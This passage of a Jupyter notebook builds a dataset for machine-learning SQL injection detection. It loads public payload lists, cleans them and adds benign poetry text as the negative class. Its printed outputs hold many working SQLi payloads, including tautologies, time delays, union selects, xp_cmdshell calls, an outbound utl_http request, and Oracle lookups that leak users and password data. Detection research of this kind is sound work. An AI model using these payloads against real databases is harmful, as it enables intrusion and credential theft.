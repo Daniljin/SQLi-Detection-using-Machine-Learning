{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[nltk_data] Downloading package punkt to /home/ebryx/nltk_data...\n",
      "[nltk_data]   Package punkt is already up-to-date!\n",
      "[nltk_data] Downloading package stopwords to /home/ebryx/nltk_data...\n",
      "[nltk_data]   Package stopwords is already up-to-date!\n",
      "[nltk_data] Downloading package wordnet to /home/ebryx/nltk_data...\n",
      "[nltk_data]   Package wordnet is already up-to-date!\n"
     ]
    }
   ],
   "source": [
    "import glob\n",
    "import time\n",
    "import pandas as pd\n",
    "# from xml.dom import minidom\n",
    "from nltk import ngrams\n",
    "from nltk.tokenize import sent_tokenize\n",
    "import nltk\n",
    "nltk.download('punkt')\n",
    "nltk.download('stopwords')\n",
    "nltk.download('wordnet')\n",
    "from nltk.stem import PorterStemmer\n",
    "from nltk.stem import PorterStemmer\n",
    "from nltk.tokenize import sent_tokenize, word_tokenize\n",
    "from nltk.stem import WordNetLemmatizer\n",
    "from nltk.corpus import stopwords \n",
    "from nltk.tokenize import word_tokenize"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Using TensorFlow backend.\n"
     ]
    }
   ],
   "source": [
    "import keras"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "import nltk\n",
    "import pandas as pd\n",
    "import os"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### File_name: git_foospidy_payloads_fuzzing_code_db_sqli.txt\n",
    "##### Comments :  \n",
    "1. removed \\n at the end of each line\n",
    "2.  replaced %20 by space\n",
    "#### Source: https://github.com/foospidy/payloads/tree/master/other/sqli"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "def clean_sqli_data(data):\n",
    "    for i in range(len(data)):\n",
    "        data[i]=data[i].replace('\\n', '')\n",
    "        data[i]=data[i].replace('%20', ' ')\n",
    "        data[i]=data[i].replace('=', ' = ')\n",
    "        data[i]=data[i].replace('((', ' (( ')\n",
    "        data[i]=data[i].replace('))', ' )) ')\n",
    "        data[i]=data[i].replace('(', ' ( ')\n",
    "        data[i]=data[i].replace(')', ' ) ')\n",
    "    return data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./data/collection/git_foospidy_payloads_fuzzing_code_db_sqli.txt'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "sql_lines_fuzzing=[]\n",
    "f = open(path, \"r\")\n",
    "for x in f:\n",
    "    sql_lines_fuzzing.append(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"'sqlvuln\\n\",\n",
       " \"'+sqlvuln\\n\",\n",
       " 'sqlvuln;\\n',\n",
       " '(sqlvuln)\\n',\n",
       " \"a' or 1=1--\\n\",\n",
       " '\"a\"\" or 1=1--\"\\n',\n",
       " ' or a = a\\n',\n",
       " \"a' or 'a' = 'a\\n\",\n",
       " '1 or 1=1\\n',\n",
       " \"a' waitfor delay '0:0:10'--\\n\",\n",
       " \"1 waitfor delay '0:0:10'--\\n\",\n",
       " 'declare @q nvarchar (4000) select @q =\\n',\n",
       " '0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A\\n',\n",
       " '0\\n',\n",
       " '031003000270000\\n']"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_fuzzing[:15]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "sql_lines_fuzzing=clean_sqli_data(sql_lines_fuzzing)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"'sqlvuln\",\n",
       " \"'+sqlvuln\",\n",
       " 'sqlvuln;',\n",
       " ' ( sqlvuln ) ',\n",
       " \"a' or 1 = 1--\",\n",
       " '\"a\"\" or 1 = 1--\"',\n",
       " ' or a  =  a',\n",
       " \"a' or 'a'  =  'a\",\n",
       " '1 or 1 = 1',\n",
       " \"a' waitfor delay '0:0:10'--\",\n",
       " \"1 waitfor delay '0:0:10'--\",\n",
       " 'declare @q nvarchar  ( 4000 )  select @q  = ',\n",
       " '0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A',\n",
       " '0',\n",
       " '031003000270000']"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_fuzzing[:15]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### File_Name: git_foospidy_payloads_other_sqli_camoufl4g3.txt\n",
    "##### Comments : ok\n",
    "#### Source: https://github.com/foospidy/payloads/tree/master/other/sqli"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./data/collection/git_foospidy_payloads_other_sqli_camoufl4g3.txt'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "sql_lines_camoufl4g3=[]\n",
    "f = open(path, \"r\")\n",
    "for x in f:\n",
    "    sql_lines_camoufl4g3.append(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"'-'\\n\",\n",
       " \"' '\\n\",\n",
       " \"'&'\\n\",\n",
       " \"'^'\\n\",\n",
       " \"'*'\\n\",\n",
       " \"' or ''-'\\n\",\n",
       " \"' or '' '\\n\",\n",
       " \"' or ''&'\\n\",\n",
       " \"' or ''^'\\n\",\n",
       " \"' or ''*'\\n\",\n",
       " '\"-\"\\n',\n",
       " '\" \"\\n',\n",
       " '\"&\"\\n',\n",
       " '\"^\"\\n',\n",
       " '\"*\"\\n']"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_camoufl4g3[:15]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "sql_lines_camoufl4g3=clean_sqli_data(sql_lines_camoufl4g3)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"'-'\",\n",
       " \"' '\",\n",
       " \"'&'\",\n",
       " \"'^'\",\n",
       " \"'*'\",\n",
       " \"' or ''-'\",\n",
       " \"' or '' '\",\n",
       " \"' or ''&'\",\n",
       " \"' or ''^'\",\n",
       " \"' or ''*'\",\n",
       " '\"-\"',\n",
       " '\" \"',\n",
       " '\"&\"',\n",
       " '\"^\"',\n",
       " '\"*\"']"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_camoufl4g3[:15]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### File_Name: git_foospidy_payloads_other_sqli_libinjection-bypasses.txt\n",
    "##### Comments: Should Remove &()o1: from start of each sentence\n",
    "#### Source: https://github.com/foospidy/payloads/tree/master/other/sqli"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./data/collection/git_foospidy_payloads_other_sqli_libinjection-bypasses.txt'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [],
   "source": [
    "sql_lines_bypasses=[]\n",
    "f = open(path, \"r\")\n",
    "for x in f:\n",
    "    sql_lines_bypasses.append(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['&()o1: select * from users where id=1 or (\\\\)=1 union select 1,@@VERSION -- 1\\n',\n",
       " '&(.)o: select * from users where id=1 or (\\\\.)=1 union select 1,@@VERSION -- 1\\n',\n",
       " '&(1&1: select * from users where id=1 or (\\\\+)=1 or 1=1 -- 1\\n',\n",
       " '&(1)o: select * from users where id=1 or (1)=1 union select 1,banner from v$version where rownum=1 -- 1\\n',\n",
       " '&(1UE: select * from users where id=1 or (\\\\+)=1 union select 1,@@VERSION -- 1\\n']"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_bypasses[:5]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [],
   "source": [
    "sql_lines_bypasses=clean_sqli_data(sql_lines_bypasses)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['& (  ) o1: select * from users where id = 1 or  ( \\\\ )  = 1 union select 1,@@VERSION -- 1',\n",
       " '& ( . ) o: select * from users where id = 1 or  ( \\\\. )  = 1 union select 1,@@VERSION -- 1',\n",
       " '& ( 1&1: select * from users where id = 1 or  ( \\\\+ )  = 1 or 1 = 1 -- 1',\n",
       " '& ( 1 ) o: select * from users where id = 1 or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " '& ( 1UE: select * from users where id = 1 or  ( \\\\+ )  = 1 union select 1,@@VERSION -- 1']"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_bypasses[:5]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [],
   "source": [
    "# if don't want &(*)* sign in beginning of each sentence then run next code else don't\n",
    "\n",
    "for i in range(len(sql_lines_bypasses)):\n",
    "    sentence=sql_lines_bypasses[i]\n",
    "    sql_lines_bypasses[i]=sentence.split(':')[1]\n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[' select * from users where id = 1 or  ( \\\\ )  = 1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or  ( \\\\. )  = 1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or  ( \\\\+ )  = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 or  ( \\\\+ )  = 1 union select 1,@@VERSION -- 1']"
      ]
     },
     "execution_count": 21,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_bypasses[:5]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### File_Name: git_foospidy_payloads_owasp_sqli.txt\n",
    "##### Comments: ok\n",
    "#### Source: https://github.com/foospidy/payloads/tree/master/other/sqli"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./data/collection/git_foospidy_payloads_owasp_sqli.txt'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [],
   "source": [
    "sql_lines_owasp=[]\n",
    "f = open(path, \"r\")\n",
    "for x in f:\n",
    "    sql_lines_owasp.append(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['a\\n',\n",
       " \"a' \\n\",\n",
       " \"a' --\\n\",\n",
       " \"a' or 1=1; --\\n\",\n",
       " '@\\n',\n",
       " '?\\n',\n",
       " \"' and 1=0) union all\\n\",\n",
       " '? or 1=1 --\\n',\n",
       " \"x' and userid is NULL; --\\n\",\n",
       " \"x' and email is NULL; --\\n\",\n",
       " \"anything' or 'x'='x\\n\",\n",
       " \"x' and 1=(select count(*) from tabname); --\\n\",\n",
       " \"x' and members.email is NULL; --\\n\",\n",
       " \"x' or full_name like '%bob%\\n\",\n",
       " '23 or 1=1; --\\n']"
      ]
     },
     "execution_count": 24,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_owasp[0:15]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [],
   "source": [
    "sql_lines_owasp=clean_sqli_data(sql_lines_owasp)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['a',\n",
       " \"a' \",\n",
       " \"a' --\",\n",
       " \"a' or 1 = 1; --\",\n",
       " '@',\n",
       " '?',\n",
       " \"' and 1 = 0 )  union all\",\n",
       " '? or 1 = 1 --',\n",
       " \"x' and userid is NULL; --\",\n",
       " \"x' and email is NULL; --\",\n",
       " \"anything' or 'x' = 'x\",\n",
       " \"x' and 1 =  ( select count ( * )  from tabname ) ; --\",\n",
       " \"x' and members.email is NULL; --\",\n",
       " \"x' or full_name like '%bob%\",\n",
       " '23 or 1 = 1; --']"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_owasp[:15]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### File_Name: git_seclist_fuzzing_sqli_Generic-SQLi.txt\n",
    "##### comments: should we remove %20 by spaces because %20 equals to space\n",
    "#### Source: https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/SQLi"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./data/collection/git_seclist_fuzzing_sqli_Generic-SQLi.txt'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [],
   "source": [
    "sql_lines_Generic=[]\n",
    "f = open(path, \"r\")\n",
    "for x in f:\n",
    "    sql_lines_Generic.append(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\")%20or%20('x'='x\\n\",\n",
       " '%20or%201=1\\n',\n",
       " \"; execute immediate 'sel' || 'ect us' || 'er'\\n\",\n",
       " 'benchmark(10000000,MD5(1))#\\n',\n",
       " 'update\\n',\n",
       " '\";waitfor delay \\'0:0:__TIME__\\'--\\n',\n",
       " '1) or pg_sleep(__TIME__)--\\n',\n",
       " '||(elt(-3+5,bin(15),ord(10),hex(char(45))))\\n',\n",
       " '\"hi\"\") or (\"\"a\"\"=\"\"a\"\\n',\n",
       " 'delete\\n',\n",
       " 'like\\n',\n",
       " '\" or sleep(__TIME__)#\\n',\n",
       " 'pg_sleep(__TIME__)--\\n',\n",
       " '*(|(objectclass=*))\\n',\n",
       " 'declare @q nvarchar (200) 0x730065006c00650063 ...\\n']"
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_Generic[:15]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [],
   "source": [
    "sql_lines_Generic=clean_sqli_data(sql_lines_Generic)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\" )  or  ( 'x' = 'x\",\n",
       " ' or 1 = 1',\n",
       " \"; execute immediate 'sel' || 'ect us' || 'er'\",\n",
       " 'benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
       " 'update',\n",
       " '\";waitfor delay \\'0:0:__TIME__\\'--',\n",
       " '1 )  or pg_sleep ( __TIME__ ) --',\n",
       " '|| ( elt ( -3+5,bin ( 15 ) ,ord ( 10 ) ,hex ( char ( 45  )  )    )  )  ',\n",
       " '\"hi\"\" )  or  ( \"\"a\"\" = \"\"a\"',\n",
       " 'delete',\n",
       " 'like',\n",
       " '\" or sleep ( __TIME__ ) #',\n",
       " 'pg_sleep ( __TIME__ ) --',\n",
       " '* ( | ( objectclass = *  )  )  ',\n",
       " 'declare @q nvarchar  ( 200 )  0x730065006c00650063 ...']"
      ]
     },
     "execution_count": 31,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_Generic[:15]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### File_name: scottparker_ml_sqli_src__trainingdata_plain.txt\n",
    "##### Comments: \n",
    "removed last 22 records containing URLs\n",
    "#### Source: https://github.com/tungpv98/Detect-Sql-Injection-by-Machine-Learning/tree/ebeb3287931677a3a42f11a7a08dbc13e374ff05/Sql-Injection/source/trainingdata"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [],
   "source": [
    "stop_words = set(stopwords.words('english')) \n",
    "def fun_remove_stop_words(posts):\n",
    "    filtered=''\n",
    "    for x in posts.split(' '):\n",
    "        if x not in stop_words:\n",
    "            filtered+=' '+x\n",
    "    return filtered"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./data/collection/'\n",
    "file=\"scottparker_ml_sqli_src__trainingdata_plain.txt\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = pd.read_csv(os.path.join(path,file), sep='Aw3s0meSc0t7', names=['benign'], header=None, engine='python')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>benign</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>Add plain text here</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>Ne te quaesiveris extra.</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>Man is his own star; and the soul that can</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>Render an honest and a perfect man,</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>Commands all light, all influence, all fate;</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                         benign\n",
       "0                           Add plain text here\n",
       "1                      Ne te quaesiveris extra.\n",
       "2    Man is his own star; and the soul that can\n",
       "3           Render an honest and a perfect man,\n",
       "4  Commands all light, all influence, all fate;"
      ]
     },
     "execution_count": 35,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [],
   "source": [
    "plain_text=df['benign'].values"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['Add plain text here', 'Ne te quaesiveris extra.',\n",
       "       'Man is his own star; and the soul that can',\n",
       "       'Render an honest and a perfect man,',\n",
       "       'Commands all light, all influence, all fate;'], dtype=object)"
      ]
     },
     "execution_count": 37,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "plain_text[:5]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [],
   "source": [
    "plain_text=plain_text[:-22] # removed last 22 records that were urls"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "3672"
      ]
     },
     "execution_count": 39,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(plain_text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {},
   "outputs": [],
   "source": [
    "data=''\n",
    "for x in plain_text:\n",
    "    data+=\" \" + x"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {},
   "outputs": [],
   "source": [
    "data=fun_remove_stop_words(data)\n",
    "data=data.split('.')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in range(len(data)):\n",
    "    data[i]=data[i].replace('<', ' <')\n",
    "    data[i]=data[i].replace('>', '> ')\n",
    "    data[i]=data[i].replace('=', ' = ')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['  Add plain text Ne te quaesiveris extra',\n",
       " ' Man star; soul Render honest perfect man, Commands light, influence, fate; Nothing falls early late',\n",
       " ' Our acts angels are, good ill, Our fatal shadows walk us still',\n",
       " ' Epilogue Beaumont Fletcher’s Honest Man’s Fortune Cast bantling rocks, Suckle she-wolf’s teat; Wintered hawk fox, Power speed hands feet',\n",
       " ' I read day verses written eminent painter original conventional']"
      ]
     },
     "execution_count": 43,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "data[:5]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Statistics"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Benign records: 3072\n"
     ]
    }
   ],
   "source": [
    "print(\"Benign records: %2i\" %len(data))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SQL fuzzing : 142  camoufl4gs : 77 parsed : 474 owasp : 167 generic : 268 \n",
      " total sql injection data : 1128 \n"
     ]
    }
   ],
   "source": [
    "print(f\"SQL fuzzing : {len(sql_lines_fuzzing)}  camoufl4gs : {len(sql_lines_camoufl4g3)} parsed : {len(sql_lines_bypasses)} owasp : {len(sql_lines_owasp)} generic : {len(sql_lines_Generic)} \\n total sql injection data : {len(sql_lines_Generic)+len(sql_lines_owasp)+len(sql_lines_bypasses)+len(sql_lines_camoufl4g3)+len(sql_lines_fuzzing)} \")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### combination of all sqli attacks"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {},
   "outputs": [],
   "source": [
    "all_sqli_sentence=sql_lines_owasp+sql_lines_bypasses+sql_lines_camoufl4g3+sql_lines_fuzzing+sql_lines_Generic"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "1128"
      ]
     },
     "execution_count": 47,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(all_sqli_sentence)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 146,
   "metadata": {},
   "outputs": [],
   "source": [
    "def optional_numeric_to_numeric(all_sqli_sentence):\n",
    "    \n",
    "    for i in range(len(all_sqli_sentence)):\n",
    "        \n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace('1 ', 'numeric')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(' 1', 'numeric')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\"'1 \", \"'numeric \")\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 1'\", \" numeric'\")\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace('1,', 'numeric,')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\"1\\ \", 'numeric')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\"‘1\", '‘numeric')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 2 \", \" numeric \")\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(' 3 ', ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(' 3--', ' numeric--')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 4 \", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 5 \", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(' 6 ', ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 7 \", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 8 \", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace('1234', ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\"22\", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 8 \", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 200 \", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\"23 \", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace('\"1', '\"numeric')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace('1\"', '\"numeric')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\"7659\", 'numeric')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 37 \", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 45 \", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\"pingnumeric\", '1')\n",
    "    \n",
    "    return all_sqli_sentence\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 109,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['a',\n",
       " \"a' \",\n",
       " \"a' --\",\n",
       " \"a' or numeric=numeric; --\",\n",
       " '@',\n",
       " '?',\n",
       " \"' and numeric= 0 )  union all\",\n",
       " '? or numeric= numeric--',\n",
       " \"x' and userid is NULL; --\",\n",
       " \"x' and email is NULL; --\",\n",
       " \"anything' or 'x' = 'x\",\n",
       " \"x' and numeric=  ( select count ( * )  from tabname ) ; --\",\n",
       " \"x' and members.email is NULL; --\",\n",
       " \"x' or full_name like '%bob%\",\n",
       " ' numeric or numeric=numeric; --',\n",
       " \"'; exec master..xp_cmdshell '172.10.1.255'--\",\n",
       " 'a',\n",
       " 'numericor numeric=numeric',\n",
       " \"numeric' or 'numeric' = 'numeric\",\n",
       " \"numericand user_name (  )   =  'dbo'\",\n",
       " '1',\n",
       " \"numeric'numeric\",\n",
       " 'numericexec sp_  ( or exec xp_ ) ',\n",
       " 'numericand numeric=numeric',\n",
       " \"numeric' and numeric=  ( select count ( * )  from tablenames ) ; --\",\n",
       " '1',\n",
       " \"numericand user_name (  )   =  'dbo'\",\n",
       " \"\\\\'; desc users; --\",\n",
       " \"1\\\\'numeric\",\n",
       " \"numeric' and non_existant_table  =  'numeric\",\n",
       " \"' or username is not NULL or username  =  '\",\n",
       " \"numericand ascii ( lower ( substring  (  (  select top numericname from sysobjects where xtype = 'u' ) , numeric, numeric )  )   )  >numeric16\",\n",
       " \"numericunion all select numeric,2,3,4,5,6,name from sysobjects where xtype  =  'u' --\",\n",
       " 'numericuni/**/on select all from where',\n",
       " '’ or ‘numeric’ = ’1',\n",
       " \"' or 'numeric' = 'numeric\",\n",
       " \"'||utl_http.request ( 'httP://192.168.1.1/' ) ||'\",\n",
       " \"' || myappadmin.adduser ( 'admin', 'newpass' )  || '\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT banner FROM v$version WHERE ROWNUM = numeric )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT SYS.LOGIN_USER FROM DUAL  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT SYS.DATABASE_NAME FROM DUAL  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT host_name FROM v$instance  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT global_name FROM global_name  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( USERNAME  )  )   FROM SYS.ALL_USERS  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( PASSWORD  )  )   FROM SYS.USER$  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( table_name  )  )   FROM sys.all_tables  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( column_name  )  )   FROM sys.all_tab_columns  )  )   AND 'i' = 'i\",\n",
